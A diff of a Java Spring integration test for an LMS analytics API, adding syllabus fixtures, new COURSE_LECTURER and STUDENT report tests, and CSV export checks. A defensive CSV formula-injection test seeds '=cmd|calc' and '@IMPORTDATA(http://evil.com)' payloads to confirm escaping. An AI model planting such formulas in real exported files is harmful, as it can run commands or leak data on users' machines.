@@ -11,20 +11,24 @@ import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.
 import com.hcmute.lms.lmsapi.document.AggregateResult;
 import com.hcmute.lms.lmsapi.document.CalculationRun;
 import com.hcmute.lms.lmsapi.document.Clo;
+import com.hcmute.lms.lmsapi.document.CloMeasurement;
 import com.hcmute.lms.lmsapi.document.Course;
 import com.hcmute.lms.lmsapi.document.CourseSection;
-import com.hcmute.lms.lmsapi.document.Plo;
 import com.hcmute.lms.lmsapi.document.Program;
 import com.hcmute.lms.lmsapi.document.ProgramVersion;
+import com.hcmute.lms.lmsapi.document.Syllabus;
 import com.hcmute.lms.lmsapi.document.Term;
 import com.hcmute.lms.lmsapi.document.UserScope;
+import com.hcmute.lms.lmsapi.document.Verification;
+import com.hcmute.lms.lmsapi.enums.AggregateScopeType;
+import com.hcmute.lms.lmsapi.enums.CalculationScope;
 import com.hcmute.lms.lmsapi.enums.CalculationStatus;
-import com.hcmute.lms.lmsapi.enums.PloCategory;
 import com.hcmute.lms.lmsapi.enums.ProgramVersionStatus;
 import com.hcmute.lms.lmsapi.enums.ResultLevel;
 import com.hcmute.lms.lmsapi.enums.Role;
 import com.hcmute.lms.lmsapi.enums.SectionStatus;
-import com.hcmute.lms.lmsapi.testsupport.ApiTestFixtures;
+import com.hcmute.lms.lmsapi.enums.SyllabusStatus;
+import com.hcmute.lms.lmsapi.enums.VerificationStatus;
 import com.hcmute.lms.lmsapi.testsupport.IntegrationTestBase;
 import java.time.Instant;
 import java.util.ArrayList;
@@ -42,6 +46,7 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
   private ProgramVersion programVersion;
   private Course course;
   private Term term;
+  private Syllabus syllabus;
   private CourseSection section1;
   private CourseSection section2;
   private Clo clo1;
@@ -63,6 +68,7 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
     programVersion = fixtures.programVersion(program, ProgramVersionStatus.ACTIVE);
     course = fixtures.course();
     term = fixtures.term();
+    syllabus = fixtures.syllabus(course, SyllabusStatus.CONFIRMED);
 
     // 2. Tạo lớp học phần
     section1 =
@@ -71,7 +77,9 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
                 CourseSection.builder()
                     .code(fixtures.code("SEC1"))
                     .courseId(course.getId())
+                    .syllabusId(syllabus.getId())
                     .termId(term.getId())
+                    .lecturerIds(List.of())
                     .enrolledCount(40)
                     .status(SectionStatus.OPEN)
                     .build());
@@ -82,47 +90,25 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
                 CourseSection.builder()
                     .code(fixtures.code("SEC2"))
                     .courseId(course.getId())
+                    .syllabusId(syllabus.getId())
                     .termId(term.getId())
+                    .lecturerIds(List.of())
                     .enrolledCount(35)
                     .status(SectionStatus.OPEN)
                     .build());
 
     // 3. Tạo CLO & PLO
-    clo1 =
-        mongo()
-            .save(
-                Clo.builder()
-                    .courseId(course.getId())
-                    .code("CLO1")
-                    .contentOriginal(ApiTestFixtures.LABEL + " Đóng gói và kế thừa")
-                    .bloomLevel(2)
-                    .build());
-
-    mongo()
-        .save(
-            Clo.builder()
-                .courseId(course.getId())
-                .code("CLO2")
-                .contentOriginal(ApiTestFixtures.LABEL + " Thiết kế đa hình")
-                .bloomLevel(4)
-                .build());
-
-    mongo()
-        .save(
-            Plo.builder()
-                .programVersionId(programVersion.getId())
-                .code("PLO1")
-                .category(PloCategory.GENERAL)
-                .displayOrder(1)
-                .contentSummary(ApiTestFixtures.LABEL + " Áp dụng kiến thức nền tảng")
-                .passThreshold(0.6)
-                .build());
+    clo1 = fixtures.clo(syllabus, "CLO1");
+    fixtures.clo(syllabus, "CLO2");
+    fixtures.plo(programVersion, "PLO1", 1);
 
     // 4. Tạo CalculationRun có status SUCCESS (Source of Truth)
     calculationRun =
         mongo()
             .save(
                 CalculationRun.builder()
+                    .scope(CalculationScope.SECTION)
+                    .lockKey(fixtures.code("LOCK"))
                     .programVersionId(programVersion.getId())
                     .status(CalculationStatus.SUCCESS)
                     .official(true)
@@ -141,6 +127,11 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
                     .level(ResultLevel.CLO)
                     .subjectId(clo1.getId())
                     .sectionId(section1.getId())
+                    .scope(
+                        AggregateResult.Scope.builder()
+                            .type(AggregateScopeType.SECTION)
+                            .refId(section1.getId())
+                            .build())
                     .counts(
                         AggregateResult.Counts.builder().enrolled(40).passed(36).failed(4).build())
                     .mean(0.85)
@@ -177,10 +168,16 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
   @AfterEach
   void cleanCustomData() {
     for (String aggId : createdAggIds) {
-      mongo().remove(mongo().findById(aggId, AggregateResult.class));
+      AggregateResult agg = mongo().findById(aggId, AggregateResult.class);
+      if (agg != null) {
+        mongo().remove(agg);
+      }
     }
     for (String runId : createdRunIds) {
-      mongo().remove(mongo().findById(runId, CalculationRun.class));
+      CalculationRun run = mongo().findById(runId, CalculationRun.class);
+      if (run != null) {
+        mongo().remove(run);
+      }
     }
   }
 
@@ -312,6 +309,8 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
         mongo()
             .save(
                 CalculationRun.builder()
+                    .scope(CalculationScope.PROGRAM)
+                    .lockKey(fixtures.code("LOCK-F-PM"))
                     .programVersionId(foreignPv.getId())
                     .status(CalculationStatus.SUCCESS)
                     .official(true)
@@ -391,6 +390,8 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
         mongo()
             .save(
                 CalculationRun.builder()
+                    .scope(CalculationScope.PROGRAM)
+                    .lockKey(fixtures.code("LOCK-F-PM"))
                     .programVersionId(foreignPv.getId())
                     .status(CalculationStatus.SUCCESS)
                     .official(true)
@@ -479,14 +480,31 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
   @Test
   @DisplayName("Xuất CSV vô hiệu hóa tấn công chèn công thức CSV (CWE-1236)")
   void testMatrixCsvExportEscapesFormulaCharacters() throws Exception {
-    Clo formulaClo =
+    Clo formulaClo1 =
         mongo()
             .save(
                 Clo.builder()
+                    .syllabusId(syllabus.getId())
                     .courseId(course.getId())
-                    .code("=cmd|calc")
+                    .code("CLO98")
+                    .contentOriginal("=cmd|calc")
+                    .bloomLevel(1)
+                    .measurement(CloMeasurement.builder().defaultPassThreshold(0.5).build())
+                    .verification(
+                        Verification.builder().status(VerificationStatus.UNVERIFIED).build())
+                    .build());
+    Clo formulaClo2 =
+        mongo()
+            .save(
+                Clo.builder()
+                    .syllabusId(syllabus.getId())
+                    .courseId(course.getId())
+                    .code("CLO99")
                     .contentOriginal("@IMPORTDATA(http://evil.com)")
                     .bloomLevel(1)
+                    .measurement(CloMeasurement.builder().defaultPassThreshold(0.5).build())
+                    .verification(
+                        Verification.builder().status(VerificationStatus.UNVERIFIED).build())
                     .build());
 
     try {
@@ -500,7 +518,93 @@ class AnalyticsControllerIntegrationTest extends IntegrationTestBase {
           .andExpect(content().string(containsString("'=cmd|calc")))
           .andExpect(content().string(containsString("'@IMPORTDATA")));
     } finally {
-      mongo().remove(formulaClo);
+      mongo().remove(formulaClo1);
+      mongo().remove(formulaClo2);
     }
+  }
+
+  @Test
+  @DisplayName("D6: Truy vấn ma trận COURSE_LECTURER thành công (200 OK)")
+  void testQueryCourseLecturerAnalytics() throws Exception {
+    mockMvc
+        .perform(
+            getAs(
+                adminToken,
+                "/api/v1/reports/analytics?dimension=COURSE_LECTURER&courseId={courseId}",
+                course.getId()))
+        .andExpect(status().isOk())
+        .andExpect(jsonPath("$.dimension").value("COURSE_LECTURER"))
+        .andExpect(jsonPath("$.level").value("CLO"))
+        .andExpect(jsonPath("$.columns").isArray())
+        .andExpect(jsonPath("$.rows").isArray())
+        .andExpect(jsonPath("$.matrix").isArray());
+  }
+
+  @Test
+  @DisplayName("D6: LECTURER truy vấn giảng viên khác ở chiều COURSE_LECTURER bị 403 Forbidden")
+  void testLecturerQueryOtherLecturerCourseLecturerForbidden() throws Exception {
+    mockMvc
+        .perform(
+            getAs(
+                lecturerToken,
+                "/api/v1/reports/analytics?dimension=COURSE_LECTURER&courseId={courseId}&lecturerId={otherLecId}",
+                course.getId(),
+                "other_lecturer_id"))
+        .andExpect(status().isForbidden())
+        .andExpect(jsonPath("$.status").value(403))
+        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
+  }
+
+  @Test
+  @DisplayName("D7: Truy vấn ma trận STUDENT thành công (200 OK)")
+  void testQueryStudentAnalytics() throws Exception {
+    mockMvc
+        .perform(
+            getAs(
+                adminToken,
+                "/api/v1/reports/analytics?dimension=STUDENT&courseId={courseId}",
+                course.getId()))
+        .andExpect(status().isOk())
+        .andExpect(jsonPath("$.dimension").value("STUDENT"))
+        .andExpect(jsonPath("$.level").value("CLO"))
+        .andExpect(jsonPath("$.columns").isArray())
+        .andExpect(jsonPath("$.rows").isArray())
+        .andExpect(jsonPath("$.matrix").isArray());
+  }
+
+  @Test
+  @DisplayName("Xuất CSV cho chiều COURSE_LECTURER và STUDENT thành công")
+  void testExportCsvNewDimensions() throws Exception {
+    // 1. Export COURSE_LECTURER
+    mockMvc
+        .perform(
+            getAs(
+                adminToken,
+                "/api/v1/reports/analytics/export?dimension=COURSE_LECTURER&courseId={courseId}",
+                course.getId()))
+        .andExpect(status().isOk())
+        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
+        .andExpect(
+            header()
+                .string(
+                    HttpHeaders.CONTENT_DISPOSITION,
+                    containsString("attachment; filename=\"analytics-matrix-course_lecturer-")))
+        .andExpect(content().string(containsString("COURSE_LECTURER")));
+
+    // 2. Export STUDENT
+    mockMvc
+        .perform(
+            getAs(
+                adminToken,
+                "/api/v1/reports/analytics/export?dimension=STUDENT&courseId={courseId}",
+                course.getId()))
+        .andExpect(status().isOk())
+        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
+        .andExpect(
+            header()
+                .string(
+                    HttpHeaders.CONTENT_DISPOSITION,
+                    containsString("attachment; filename=\"analytics-matrix-student-")))
+        .andExpect(content().string(containsString("STUDENT")));
   }
 }
